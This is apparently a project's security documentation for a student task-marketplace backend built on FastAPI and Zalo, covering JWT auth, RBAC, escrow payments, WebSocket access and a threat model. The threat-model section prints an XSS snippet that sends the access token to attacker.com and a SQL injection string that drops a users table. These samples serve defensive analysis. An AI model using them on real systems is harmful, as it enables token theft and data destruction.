# Security Documentation

**Project:** Dịch Vụ Nhỏ Cho Sinh Viên (Mini Services for Students)
**Last Updated:** 2026-02-04
**Status:** Development

---

## Table of Contents

1. [Overview](#1-overview)
2. [Authentication](#2-authentication)
3. [Authorization](#3-authorization)
4. [Data Protection](#4-data-protection)
5. [Input Validation](#5-input-validation)
6. [Security Headers & CORS](#6-security-headers--cors)
7. [Payment Security](#7-payment-security)
8. [WebSocket Security](#8-websocket-security)
9. [Known Vulnerabilities](#9-known-vulnerabilities)
10. [Threat Modeling](#10-threat-modeling)
11. [Security Checklist](#11-security-checklist)

---

## 1. Overview

### 1.1 Security Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    SECURITY LAYER ARCHITECTURE                   │
└─────────────────────────────────────────────────────────────────┘

                    ┌─────────────────┐
                    │  Zalo Mini App  │
                    │    (Frontend)   │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  CORS Validation │
                    └────────┬────────┘
                             │
┌───────────────────────────────────────────────────────────────┐
│                    FastAPI Backend                             │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │  1. Authentication Layer (JWT + Zalo OAuth)            │  │
│  │     - Token verification                                │  │
│  │     - User session management                           │  │
│  └─────────────────────────────────────────────────────────┘  │
│                             │                                   │
│  ┌─────────────────────────▼───────────────────────────────┐  │
│  │  2. Authorization Layer (Role-based)                    │  │
│  │     - Requester vs Tasker permissions                   │  │
│  │     - Resource ownership checks                         │  │
│  └─────────────────────────────────────────────────────────┘  │
│                             │                                   │
│  ┌─────────────────────────▼───────────────────────────────┐  │
│  │  3. Input Validation (Pydantic)                         │  │
│  │     - Schema validation                                 │  │
│  │     - Field constraints                                 │  │
│  └─────────────────────────────────────────────────────────┘  │
│                             │                                   │
│  ┌─────────────────────────▼───────────────────────────────┐  │
│  │  4. Business Logic Layer                                │  │
│  │     - Payment escrow                                    │  │
│  │     - Transaction atomicity                             │  │
│  └─────────────────────────────────────────────────────────┘  │
│                             │                                   │
│  ┌─────────────────────────▼───────────────────────────────┐  │
│  │  5. Data Access Layer (SQLAlchemy ORM)                  │  │
│  │     - SQL injection prevention                          │  │
│  │     - Prepared statements                               │  │
│  └─────────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────┘
                             │
                    ┌────────▼────────┐
                    │  SQLite Database │
                    └─────────────────┘
```

### 1.2 Security Principles

- **Defense in Depth:** Multiple security layers
- **Least Privilege:** Users only access what they need
- **Fail Secure:** Deny by default, explicit allow
- **Audit Everything:** Log all security-relevant events
- **Secure by Default:** Safe configuration out-of-the-box

---

## 2. Authentication

### 2.1 JWT Implementation

**Location:** `backend/app/core/security.py`

#### Token Types

| Token Type | Expiry | Use Case | Algorithm |
|------------|--------|----------|-----------|
| **Access Token** | 15 minutes | API authentication | HS256 |
| **Refresh Token** | 7 days | Token renewal | HS256 |

#### Token Structure

```python
# Access Token Payload
{
    "sub": "123",           # User ID
    "zalo_id": "abc123",    # Zalo OAuth ID
    "name": "John Doe",     # User name
    "is_tasker": true,      # Role flag
    "exp": 1234567890,      # Expiration timestamp
    "iat": 1234567890,      # Issued at timestamp
    "type": "access"        # Token type
}
```

#### Token Generation

```python
# backend/app/core/security.py:12-42

def create_access_token(data: Dict[str, Any], expires_delta: Optional[timedelta] = None) -> str:
    """
    Create a JWT access token.
    - Uses HS256 algorithm
    - Default expiry: 15 minutes
    - Includes: sub, zalo_id, name, is_tasker, exp, iat, type
    """
    to_encode = data.copy()

    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)

    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "type": "access"
    })

    encoded_jwt = jwt.encode(
        to_encode,
        settings.JWT_SECRET,
        algorithm=settings.JWT_ALGORITHM
    )

    return encoded_jwt
```

#### Token Verification

```python
# backend/app/core/security.py:74-99

def verify_token(token: str, token_type: str = "access") -> Optional[Dict[str, Any]]:
    """
    Verify and decode a JWT token.

    Security checks:
    1. Signature verification (HMAC-SHA256)
    2. Expiration validation
    3. Token type validation
    """
    try:
        payload = jwt.decode(
            token,
            settings.JWT_SECRET,
            algorithms=[settings.JWT_ALGORITHM]
        )

        # Verify token type
        if payload.get("type") != token_type:
            return None

        return payload

    except JWTError:
        return None
```

### 2.2 Zalo OAuth Flow

**Location:** `backend/app/routers/auth.py`

#### OAuth Security Features

1. **appsecret_proof:** HMAC-SHA256 signature required since 2024
2. **miniapp_id:** Verifies token from correct Mini App
3. **Token Verification:** Server-side validation with Zalo API

#### OAuth Implementation

```python
# backend/app/routers/auth.py:42-75

# Generate appsecret_proof (HMAC-SHA256 of access_token with app_secret)
# Required since January 1, 2024 for Zalo Graph API
appsecret_proof = hmac.new(
    settings.ZALO_APP_SECRET.encode('utf-8'),
    request.access_token.encode('utf-8'),
    hashlib.sha256
).hexdigest()

# Get user info from Zalo API
async with httpx.AsyncClient() as client:
    response = await client.get(
        "https://graph.zalo.me/v2.0/me",
        params={
            "fields": "id,name,picture",
            "miniapp_id": settings.ZALO_MINIAPP_ID,
        },
        headers={
            "access_token": request.access_token,
            "appsecret_proof": appsecret_proof,
        },
        timeout=10.0
    )
```

**Security Measures:**

- Server-side token validation (not client-side only)
- HMAC signature prevents token tampering
- Timeout protection (10 seconds)
- Error handling for network failures
- Logging of authentication attempts

### 2.3 Token Storage

**Frontend:** `localStorage` (Zalo Mini App context)

```typescript
// Token storage pattern
const token = response.access_token;
localStorage.setItem('access_token', token);
localStorage.setItem('refresh_token', response.refresh_token);

// Token usage
const headers = {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
};
```

**Security Considerations:**

⚠️ **Risks:**
- XSS attacks can steal tokens from localStorage
- No HttpOnly protection in Mini App context

✅ **Mitigations:**
- Short access token expiry (15 minutes)
- Content Security Policy headers
- Input sanitization prevents XSS
- Secure token refresh mechanism

### 2.4 Dev Login (DEBUG Mode Only)

**Location:** `backend/app/routers/auth.py:196-256`

```python
@router.post("/dev-login", response_model=TokenResponse)
async def dev_login(
    name: str = "Test User",
    db: Session = Depends(get_db)
):
    """
    Development login - creates a test user without Zalo.
    Only available when DEBUG=true.
    """
    if not settings.DEBUG:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Not found"
        )
```

**Security Features:**

- Only enabled when `DEBUG=true`
- Returns 404 in production (endpoint hidden)
- Generates random test Zalo IDs
- Creates wallets with mock balance
- Logs all dev logins

---

## 3. Authorization

### 3.1 Role-Based Access Control (RBAC)

**Roles:**

| Role | Description | Permissions |
|------|-------------|-------------|
| **Requester** | Posts tasks | Create tasks, Accept applications, Release payments |
| **Tasker** | Performs tasks | Apply to tasks, Mark complete, Receive payments |
| **Both** | Can switch roles | All permissions based on context |

**Implementation:** User model has `is_tasker` boolean flag

### 3.2 Authentication Dependencies

**Location:** `backend/app/core/dependencies.py`

#### get_current_user

```python
# backend/app/core/dependencies.py:17-63

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_db)
) -> User:
    """
    Get the current authenticated user.

    Security checks:
    1. Verify Bearer token format
    2. Decode and validate JWT
    3. Check token type (access)
    4. Verify user exists in database
    """
    token = credentials.credentials

    # Verify token
    payload = verify_token(token, token_type="access")
    if payload is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Get user ID from payload
    user_id = payload.get("sub")
    if user_id is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid token payload",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Get user from database
    user = db.query(User).filter(User.id == int(user_id)).first()
    if user is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User not found",
            headers={"WWW-Authenticate": "Bearer"},
        )

    return user
```

#### get_current_tasker

```python
# backend/app/core/dependencies.py:83-97

async def get_current_tasker(
    current_user: User = Depends(get_current_user)
) -> User:
    """
    Get the current user and verify they are a registered Tasker.

    Security check:
    - Ensures user has is_tasker=True
    """
    if not current_user.is_tasker:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="You must be a registered Tasker to perform this action"
        )
    return current_user
```

### 3.3 Endpoint-Level Authorization

**Pattern:** Dependency injection for access control

```python
# Example: Task application endpoint
@router.post("/tasks/{task_id}/apply")
async def apply_to_task(
    task_id: int,
    request: TaskApplicationCreate,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_tasker)  # Requires Tasker role
):
    # Only Taskers can apply
    pass
```

### 3.4 Resource Ownership Checks

**Pattern:** Verify user owns resource before modification

```python
# Example: Task update
task = db.query(Task).filter(Task.id == task_id).first()

# Check ownership
if task.requester_id != current_user.id:
    raise HTTPException(
        status_code=status.HTTP_403_FORBIDDEN,
        detail="You can only edit your own tasks"
    )
```

**Applied to:**

- Task CRUD operations
- Payment release
- Application acceptance
- Message access
- Wallet operations

---

## 4. Data Protection

### 4.1 Token Encryption

**Algorithm:** HS256 (HMAC-SHA256)

```python
# backend/app/config.py:48-49
JWT_SECRET: str = "change-this-secret-key-in-production"
JWT_ALGORITHM: str = "HS256"
```

**Security Properties:**

- **Symmetric encryption:** Same key for sign/verify
- **256-bit security:** SHA256 hash
- **MAC protection:** Prevents tampering
- **No encryption:** Payload is base64-encoded (not encrypted)

⚠️ **Warning:** Do not store sensitive data in JWT payload (it's readable)

### 4.2 Password Handling

**Current Implementation:** None (Zalo OAuth only)

- No password storage
- No password hashing required
- All authentication via Zalo

**Future Considerations:** If adding email/password:

```python
# Recommended: bcrypt or Argon2
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)
```

### 4.3 Sensitive Data Exposure

**Protected Fields:**

| Field | Protection | Notes |
|-------|------------|-------|
| `JWT_SECRET` | Environment variable | Never commit to git |
| `ZALO_APP_SECRET` | Environment variable | Used for appsecret_proof |
| `ZALOPAY_KEY1/KEY2` | Environment variable | Payment credentials |
| Zalo access tokens | Logged partially | Only first/last 10 chars |

**Logging Security:**

```python
# backend/app/routers/auth.py:37-40
token = request.access_token
token_preview = f"{token[:10]}...{token[-10:]}" if len(token) > 20 else token
logger.info(f"Received access_token: {token_preview} (length: {len(token)})")
```

### 4.4 JWT Secret Management

**Current (Development):**

```bash
# .env
JWT_SECRET=change-this-secret-key-in-production
```

**Production Requirements:**

```bash
# Generate secure secret
python -c "import secrets; print(secrets.token_urlsafe(64))"

# .env.production
JWT_SECRET=<generated-secret-minimum-32-characters>
```

**Best Practices:**

- Minimum 32 characters
- Random generation
- Never reuse across environments
- Rotate periodically (requires re-login)
- Store in secure vault (not .env in production)

---

## 5. Input Validation

### 5.1 Pydantic Schema Validation

**All API inputs validated via Pydantic models**

#### Task Creation Validation

```python
# backend/app/schemas/task.py:12-21

class TaskBase(BaseModel):
    """Base task schema."""
    title: str = Field(..., min_length=5, max_length=200)
    description: Optional[str] = Field(None, max_length=2000)
    price: int = Field(..., gt=0, le=10000000)  # Max 10M VND
    price_negotiable: bool = False
    category_id: int
    location_from: Optional[str] = Field(None, max_length=200)
    location_to: Optional[str] = Field(None, max_length=200)
    deadline: Optional[datetime] = None
```

**Validation Rules:**

- `title`: 5-200 characters (prevents empty or excessively long titles)
- `description`: Max 2000 characters (prevents DoS via large payloads)
- `price`: 1-10,000,000 VND (realistic range, prevents negative/zero prices)
- `location_from/to`: Max 200 characters
- Type validation: Pydantic ensures correct types

#### Authentication Validation

```python
# backend/app/schemas/auth.py:9-11

class ZaloAuthRequest(BaseModel):
    """Zalo OAuth login request."""
    access_token: str = Field(..., description="Zalo access token from Mini App SDK")
```

- Required field (cannot be None)
- Must be string type

### 5.2 SQL Injection Prevention

**Protection:** SQLAlchemy ORM with parameterized queries

```python
# ✅ SAFE: ORM query (parameterized)
user = db.query(User).filter(User.id == user_id).first()

# ✅ SAFE: ORM with parameters
tasks = db.query(Task).filter(
    Task.requester_id == current_user.id,
    Task.status == TaskStatus.OPEN.value
).all()

# ❌ UNSAFE: Raw SQL (NEVER DO THIS)
# db.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

**SQLAlchemy Security Features:**

- Prepared statements
- Parameter binding
- Type casting
- Escaping handled automatically

### 5.3 XSS Prevention

**Backend Protection:**

1. **No HTML rendering:** API returns JSON only
2. **Content-Type:** `application/json`
3. **Schema validation:** Pydantic prevents injection

**Frontend Responsibility:**

- React escapes by default
- Use `textContent` not `innerHTML`
- Sanitize user-generated content

### 5.4 Field Constraints Summary

| Field | Min | Max | Type | Notes |
|-------|-----|-----|------|-------|
| Task title | 5 | 200 | str | Required |
| Task description | 0 | 2000 | str | Optional |
| Task price | 1 | 10000000 | int | VND |
| Location | 0 | 200 | str | Optional |
| Message content | 1 | - | str | Required |
| Application message | 0 | 500 | str | Optional |

---

## 6. Security Headers & CORS

### 6.1 CORS Configuration

**Location:** `backend/app/main.py:76-82`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### 6.2 Allowed Origins

**Location:** `backend/app/config.py:20-31`

```python
CORS_ORIGINS: List[str] = [
    "http://localhost:3000",
    "http://localhost:2999",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:2999",
    # Zalo Mini App origins
    "https://h5.zalo.me",
    "https://stc-h5.zalo.me",
    "https://stc-sandbox.zalo.me",
    "https://h5.zdn.vn",
    "https://stc-h5.zdn.vn",
]
```

**Security Considerations:**

✅ **Secure:**
- Whitelist only known origins
- No wildcard in production
- Includes Zalo Mini App domains

⚠️ **Risks:**
- `allow_credentials=True` with multiple origins
- `allow_methods=["*"]` permits all HTTP methods

**Production Recommendations:**

```python
# production.py
CORS_ORIGINS = [
    "https://viecz.zalopay.vn",  # Production Mini App URL
    "https://h5.zalo.me",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Explicit methods
    allow_headers=["Content-Type", "Authorization"],  # Explicit headers
    max_age=3600,
)
```

### 6.3 Origin Logging Middleware

**Location:** `backend/app/main.py:67-74`

```python
class OriginLoggerMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        origin = request.headers.get("origin", "no-origin")
        logger.info(f"Request from origin: {origin}, method: {request.method}, path: {request.url.path}")
        response = await call_next(request)
        return response
```

**Purpose:** Debug CORS issues, audit request sources

### 6.4 Security Headers (Missing)

⚠️ **Currently Not Implemented:**

```python
# TODO: Add security headers middleware
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["Content-Security-Policy"] = "default-src 'self'"
        return response
```

---

## 7. Payment Security

### 7.1 Escrow Model

**Flow:** Requester → Escrow → Tasker (minus 10% fee)

```
Phase 1: Payment Hold (Escrow)
┌──────────────┐        ┌──────────────┐        ┌──────────────┐
│  Requester   │        │    Escrow    │        │    Tasker    │
│   Wallet     │───────>│    Wallet    │        │              │
└──────────────┘        └──────────────┘        └──────────────┘
   -100,000đ              +100,000đ

Phase 2: Payment Release (Task Completed)
┌──────────────┐        ┌──────────────┐        ┌──────────────┐
│  Requester   │        │    Escrow    │        │    Tasker    │
│              │        │    Wallet    │───────>│   Wallet     │
└──────────────┘        └──────────────┘        └──────────────┘
                          -100,000đ              +90,000đ

                        ┌──────────────┐
                        │   Platform   │
                        │   Wallet     │
                        └──────────────┘
                          +10,000đ
```

### 7.2 Transaction Atomicity

**Location:** `backend/app/services/mock_payment.py:126-209`

```python
def create_escrow_payment(self, task: Task, payer: User) -> dict:
    """
    Create escrow payment for a task.

    Atomic operations:
    1. Check balance
    2. Deduct from payer wallet
    3. Add to escrow wallet
    4. Create transaction record
    5. Update task status
    6. Commit all or rollback
    """
    try:
        # Get wallets
        payer_wallet = self.get_or_create_user_wallet(payer.id)
        escrow_wallet = self.get_or_create_escrow_wallet()

        amount = task.price

        # Check balance
        if payer_wallet.available_balance < amount:
            return {"success": False, "error": "Số dư không đủ"}

        # Atomic transaction
        payer_wallet.balance -= amount
        escrow_wallet.balance += amount

        # Record transactions
        self._record_transaction(...)

        # Update task
        task.status = TaskStatus.IN_PROGRESS.value

        self.db.commit()

        return {"success": True}

    except Exception as e:
        self.db.rollback()
        logger.error(f"Escrow payment error: {e}")
        return {"success": False, "error": str(e)}
```

**Security Features:**

- Try-catch with rollback on error
- Balance validation before deduction
- Wallet transaction logging
- Reference ID generation
- Transaction status tracking

### 7.3 Balance Validation

**Location:** `backend/app/services/mock_payment.py:145-150`

```python
# Check balance
if payer_wallet.available_balance < amount:
    return {
        "success": False,
        "error": f"Số dư không đủ. Cần {amount:,}đ, hiện có {payer_wallet.available_balance:,}đ"
    }
```

**Wallet Balance Types:**

```python
# backend/app/models/wallet.py (inferred)
@property
def available_balance(self) -> int:
    """Balance minus frozen amount."""
    return self.balance - self.frozen_balance
```

### 7.4 Mock vs Real Payment Modes

**Location:** `backend/app/config.py:78-80`

```python
# Mock Payment (for development)
MOCK_PAYMENT_ENABLED: bool = True  # Set to False when ZaloPay is approved
MOCK_INITIAL_BALANCE: int = 1000000  # 1,000,000 VND initial balance for new users
```

**Mock Payment Security:**

✅ **Safe for Development:**
- Virtual wallets (no real money)
- Isolated test environment
- Transaction logging

⚠️ **Production Risks:**
- Must disable before launch
- No real payment validation
- Fraud potential if exposed

**Real Payment (ZaloPay):**

See [ZALOPAY_INTEGRATION.md](./ZALOPAY_INTEGRATION.md) for:
- MAC signature verification
- Callback authentication
- Payment status validation
- Refund handling

### 7.5 Platform Fee Calculation

**Location:** `backend/app/services/mock_payment.py:241-243`

```python
# Calculate fees
platform_fee = (amount * self.platform_fee_percent) // 100
tasker_amount = amount - platform_fee
```

**Configuration:**

```python
# backend/app/config.py:74
PLATFORM_FEE_PERCENT: int = 10  # 10% platform fee
```

**Example:**

```
Task Price:     100,000đ
Platform Fee:   10,000đ (10%)
Tasker Receives: 90,000đ
```

### 7.6 Payment Authorization

**Pattern:** Only requester can release payment

```python
# backend/app/routers/payments.py (inferred)
@router.post("/release/{task_id}")
async def release_payment(
    task_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    task = db.query(Task).filter(Task.id == task_id).first()

    # Authorization check
    if task.requester_id != current_user.id:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Not authorized"
        )

    # Only release if task completed
    if task.status != TaskStatus.COMPLETED.value:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Task must be completed first"
        )
```

---

## 8. WebSocket Security

### 8.1 Token Validation in WebSocket

**Location:** `backend/app/websocket/chat.py:62-65`

```python
# Authenticate
user = await get_user_from_token(token, db)
if not user:
    await websocket.close(code=4001, reason="Unauthorized")
    return
```

#### Token Verification Function

```python
# backend/app/websocket/chat.py:21-31

async def get_user_from_token(token: str, db: Session) -> User | None:
    """Verify token and get user."""
    payload = verify_token(token)
    if not payload:
        return None

    user_id = payload.get("sub")
    if not user_id:
        return None

    return db.query(User).filter(User.id == int(user_id)).first()
```

### 8.2 Connection Authorization

**Location:** `backend/app/websocket/chat.py:67-75`

```python
# Verify user has access to task
task = db.query(Task).filter(Task.id == task_id).first()
if not task:
    await websocket.close(code=4004, reason="Task not found")
    return

if task.requester_id != user.id and task.tasker_id != user.id:
    await websocket.close(code=4003, reason="Forbidden")
    return
```

**Authorization Logic:**

- User must be either requester OR tasker
- Task must exist
- Custom close codes for different errors

### 8.3 Message Sender Verification

**Location:** `backend/app/websocket/chat.py:99-107`

```python
# Determine receiver
receiver_id = task.tasker_id if task.requester_id == user.id else task.requester_id

if not receiver_id:
    await websocket.send_json({
        "type": "error",
        "message": "No recipient available"
    })
    continue
```

**Security Features:**

- Sender verified via JWT
- Receiver derived from task relationship
- Cannot spoof sender ID
- Only 2-party conversations

### 8.4 WebSocket Endpoint

**Location:** `backend/app/main.py:108-119`

```python
@app.websocket("/ws/chat/{task_id}")
async def websocket_chat_endpoint(
    websocket: WebSocket,
    task_id: int,
    token: str = Query(...)
):
    """WebSocket endpoint for task chat."""
    db = next(get_db())
    try:
        await chat_websocket(websocket, task_id, token, db)
    finally:
        db.close()
```

**Connection URL:**

```
ws://localhost:8000/ws/chat/{task_id}?token=<jwt_access_token>
```

**Security Considerations:**

⚠️ **Token in Query String:**
- Visible in logs
- Visible in network tools
- Cannot use Authorization header with WebSocket

✅ **Mitigations:**
- Short token expiry (15 minutes)
- Token validated on connection
- Connection closed on invalid token

---

## 9. Known Vulnerabilities

### 9.1 DEBUG Mode Endpoints

**Risk:** Information disclosure, unauthorized access

**Affected Endpoints:**

```python
# backend/app/main.py:55-56
docs_url="/docs" if settings.DEBUG else None,
redoc_url="/redoc" if settings.DEBUG else None,

# backend/app/routers/auth.py:196-209
@router.post("/dev-login", response_model=TokenResponse)
async def dev_login(name: str = "Test User", db: Session = Depends(get_db)):
    if not settings.DEBUG:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Not found")
```

**Exposed Information:**

- API structure (/docs)
- Endpoint parameters
- Schema definitions
- Example payloads

**Mitigation:**

```bash
# Production .env
DEBUG=false
```

**Impact:**

- Low (hidden when DEBUG=false)
- Returns 404 in production

### 9.2 Mock Payment Mode

**Risk:** Financial fraud, unauthorized transactions

**Configuration:**

```python
# backend/app/config.py:79
MOCK_PAYMENT_ENABLED: bool = True
```

**Vulnerabilities:**

- Virtual money not validated
- No real payment gateway
- Unlimited balance generation
- No transaction verification

**Mitigation:**

```bash
# Production .env
MOCK_PAYMENT_ENABLED=false
```

**Pre-Production Checklist:**

- [ ] Disable mock payment
- [ ] Enable ZaloPay integration
- [ ] Test real payment flow
- [ ] Remove mock wallet endpoints

### 9.3 SQLite Limitations

**Risk:** Concurrency issues, file corruption

**Current Setup:**

```python
# backend/app/config.py:43
DATABASE_URL: str = "sqlite:///./data/viecz.db"
```

**Limitations:**

- Single-writer lock
- No concurrent writes
- File-based (corruption risk)
- Limited transaction isolation

**Production Recommendation:**

```python
# PostgreSQL
DATABASE_URL = "postgresql://user:pass@host:5432/viecz"
```

**Migration Priority:** High (before launch)

### 9.4 JWT Secret in .env

**Risk:** Token forgery if .env leaked

**Current:**

```bash
# .env
JWT_SECRET=change-this-secret-key-in-production
```

**Vulnerabilities:**

- Weak default secret
- Stored in plaintext file
- Could be committed to git
- Shared across environments

**Mitigation:**

```bash
# Generate strong secret
python -c "import secrets; print(secrets.token_urlsafe(64))"

# Store in secure vault
# - AWS Secrets Manager
# - HashiCorp Vault
# - Environment variable from CI/CD
```

### 9.5 CORS Wildcard Methods

**Risk:** CSRF attacks, unauthorized API calls

**Current:**

```python
allow_methods=["*"],
allow_headers=["*"],
```

**Mitigation:**

```python
# Production
allow_methods=["GET", "POST", "PUT", "DELETE"],
allow_headers=["Content-Type", "Authorization"],
```

### 9.6 No Rate Limiting

**Risk:** DoS attacks, brute force

**Missing:**

- Request rate limiting
- Login attempt throttling
- Payment request limiting

**Recommended:**

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.post("/auth/zalo")
@limiter.limit("5/minute")
async def zalo_login(...):
    pass
```

### 9.7 WebSocket Token in URL

**Risk:** Token leakage in logs

**Current:**

```
ws://host/ws/chat/{task_id}?token=<jwt>
```

**Visible in:**

- Server access logs
- Proxy logs
- Browser history
- Network monitoring tools

**Mitigation:**

- Use short-lived tokens (15 min)
- Sanitize logs
- Consider custom header (if supported by client)

---

## 10. Threat Modeling

### 10.1 Threat Actors

| Actor | Motivation | Capabilities | Likelihood |
|-------|------------|--------------|------------|
| **Malicious User** | Fraud, free services | Account creation, API access | High |
| **Competitor** | Service disruption | DDoS, data scraping | Medium |
| **Insider** | Data theft | Database access | Low |
| **Script Kiddie** | Chaos | Automated tools | Medium |

### 10.2 Attack Scenarios

#### Scenario 1: Payment Fraud

**Attack:**

```
1. Attacker creates task
2. Accepts own application (alt account)
3. Pays with mock wallet (if enabled)
4. Marks task complete
5. Receives payment to alt account
```

**Mitigations:**

- [ ] Disable mock payment in production
- [ ] Implement identity verification (KYC)
- [ ] Add fraud detection rules
- [ ] Monitor suspicious patterns
- [ ] Escrow holds funds

#### Scenario 2: Token Theft (XSS)

**Attack:**

```html
<!-- Malicious task description -->
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
</script>
```

**Mitigations:**

- [x] Pydantic validation prevents script tags
- [x] React escapes user content by default
- [x] API returns JSON only (no HTML)
- [ ] Add Content Security Policy headers
- [x] Short token expiry (15 min)

#### Scenario 3: SQL Injection

**Attack:**

```python
# Vulnerable code (NOT PRESENT)
task_id = "1; DROP TABLE users; --"
db.execute(f"SELECT * FROM tasks WHERE id = {task_id}")
```

**Mitigations:**

- [x] SQLAlchemy ORM prevents injection
- [x] Parameterized queries
- [x] Type validation (Pydantic)
- [x] No raw SQL queries

#### Scenario 4: Unauthorized Payment Release

**Attack:**

```
1. Attacker intercepts task_id
2. Calls POST /payments/release/{task_id}
3. Attempts to release payment early
```

**Mitigations:**

- [x] Authorization check (requester only)
- [x] Status validation (must be COMPLETED)
- [x] Resource ownership verification
- [x] Transaction logging

#### Scenario 5: WebSocket Eavesdropping

**Attack:**

```
1. Attacker steals JWT token
2. Connects to other users' chats
3. Reads private messages
```

**Mitigations:**

- [x] Token verification on connect
- [x] Task participant check
- [x] Token expiry (15 min)
- [ ] Add rate limiting to WebSocket connections

### 10.3 STRIDE Analysis

| Threat | Example | Mitigation | Status |
|--------|---------|------------|--------|
| **Spoofing** | Fake user login | Zalo OAuth + JWT | ✅ Done |
| **Tampering** | Modify payment amount | JWT signature, DB constraints | ✅ Done |
| **Repudiation** | Deny task completion | Transaction logging | ✅ Done |
| **Information Disclosure** | Leak user data | Authorization checks | ✅ Done |
| **Denial of Service** | Flood API with requests | Rate limiting | ❌ Missing |
| **Elevation of Privilege** | Tasker acts as Requester | Role checks | ✅ Done |

### 10.4 Data Flow Diagram (DFD)

```
┌─────────────┐
│ Zalo Mini   │
│ App (User)  │
└──────┬──────┘
       │ HTTPS
       │ JWT Token
       ▼
┌─────────────────────────────────────────────────────────┐
│ FastAPI Backend                                          │
│                                                           │
│  ┌───────────────┐      ┌───────────────┐               │
│  │ Auth Layer    │─────>│ Business      │               │
│  │ (JWT + Zalo)  │      │ Logic         │               │
│  └───────────────┘      └───────┬───────┘               │
│                                  │                        │
│                         ┌────────▼────────┐              │
│                         │ SQLAlchemy ORM  │              │
│                         └────────┬────────┘              │
└──────────────────────────────────┼────────────────────────┘
                                   │
                          ┌────────▼────────┐
                          │ SQLite Database │
                          │ (File-based)    │
                          └─────────────────┘

External Services:
┌─────────────┐    ┌─────────────┐
│ Zalo Graph  │    │ ZaloPay API │
│ API         │    │ (Payments)  │
└─────────────┘    └─────────────┘
```

**Trust Boundaries:**

1. **User ↔ Backend:** HTTPS, JWT authentication
2. **Backend ↔ Database:** Local file access, ORM
3. **Backend ↔ Zalo API:** HTTPS, appsecret_proof
4. **Backend ↔ ZaloPay:** HTTPS, MAC signature

---

## 11. Security Checklist

### 11.1 Pre-Production Tasks

**Authentication & Authorization:**

- [ ] Rotate JWT_SECRET to strong random value
- [ ] Store secrets in secure vault (not .env)
- [ ] Disable DEBUG mode (`DEBUG=false`)
- [ ] Remove /dev-login endpoint
- [ ] Hide API docs (/docs, /redoc)
- [ ] Implement rate limiting (5 req/min for auth)
- [ ] Add account lockout after failed logins

**Payment Security:**

- [ ] Disable mock payment (`MOCK_PAYMENT_ENABLED=false`)
- [ ] Integrate ZaloPay production credentials
- [ ] Test real payment flow end-to-end
- [ ] Verify MAC signature on callbacks
- [ ] Implement idempotency for payments
- [ ] Add transaction amount limits
- [ ] Enable fraud detection rules

**Data Protection:**

- [ ] Migrate from SQLite to PostgreSQL
- [ ] Enable database encryption at rest
- [ ] Implement backup strategy
- [ ] Sanitize logs (no tokens/secrets)
- [ ] Add data retention policy
- [ ] Implement GDPR compliance (if applicable)

**Network Security:**

- [ ] Use HTTPS only (no HTTP)
- [ ] Update CORS to production origins only
- [ ] Add security headers middleware
- [ ] Whitelist ZaloPay callback IPs
- [ ] Enable request logging
- [ ] Implement IP-based rate limiting

**Code Security:**

- [ ] Run security linter (bandit)
- [ ] Update all dependencies
- [ ] Remove commented debug code
- [ ] Add input sanitization tests
- [ ] Review all SQL queries
- [ ] Validate file upload security (if added)

### 11.2 Environment Hardening

**Production .env Template:**

```bash
# Server
ENVIRONMENT=production
DEBUG=false
API_URL=https://api.viecz.vn

# CORS (Production Mini App URL only)
CORS_ORIGINS=["https://viecz.zalopay.vn"]

# Database
DATABASE_URL=postgresql://user:password@host:5432/viecz

# JWT (Generate: python -c "import secrets; print(secrets.token_urlsafe(64))")
JWT_SECRET=<64-character-random-string>
JWT_ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=15
REFRESH_TOKEN_EXPIRE_DAYS=7

# Zalo OAuth
ZALO_APP_ID=<production-app-id>
ZALO_APP_SECRET=<production-secret>
ZALO_MINIAPP_ID=<production-miniapp-id>

